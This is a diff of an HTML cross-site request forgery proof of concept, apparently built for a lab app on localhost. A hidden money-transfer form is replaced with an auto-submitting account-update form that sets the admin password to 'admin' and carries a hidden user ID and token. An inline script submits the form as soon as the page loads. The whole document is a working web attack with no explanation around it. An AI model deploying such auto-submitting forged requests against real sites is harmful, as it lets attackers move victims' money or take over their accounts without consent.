@@ -2,20 +2,27 @@
 
 <body>
 
-       
-    <form action='https://127.0.0.1:8080/transfer' method="POST" id="dubi">
-            
-    	<label for="inputTo">To</label>
-        <input type="text" class="form-control" id="inputTo" name="user_to" value="chipi" placeholder="Who do you want to transfer to?">
-              
-        <label for="inputAmount">Amount</label>
-        <input type="number" class="form-control" id="inputAmount" name="amount" value=1000 placeholder="Amount to transfer">
-             
-        <button type="submit" class="btn btn-primary">Send the Money!</button>
-     
-    </form>
+       <form action="https://127.0.0.1:8080/account" method="post" id="acc">
+			<input name="userid" type="hidden" value="50ec7f33-893b-4a4d-b2c8-309257282212">
+			<input name="token" type="hidden" value="21232f297a57a5a743894a0e4a801fc3">
+			<label for="username">Username</label>
+			<input id="username" name="username" type="text" value="admin" disabled="disabled">
+			<label for="name">Full name</label>
+			<input id="name" name="name" type="text" value="Admin">
+			<label for="email">Email address</label>
+			<input id="email" name="email" type="email" value="admin@astro.mine">
+			<label for="company">Company</label>
+			<input id="company" name="company" type="text" value="Astromine">
+			<label for="url">URL</label>
+			<input id="url" name="url" type="text" value="https://astromine.com">
+			<label for="password">New password</label>
+			<input id="password" name="password" type="password" value="admin">
+			<label for="password">New password (repeat)</label>
+			<input id="password_repeat" name="password_repeat" type="password" value="admin">
+			<button type="submit">Update</button>
+	</form>
     
-    <script> document.getElementById("dubi").submit(); </script>
+    <script> document.getElementById("acc").submit(); </script>
     
 </body>
 </html>
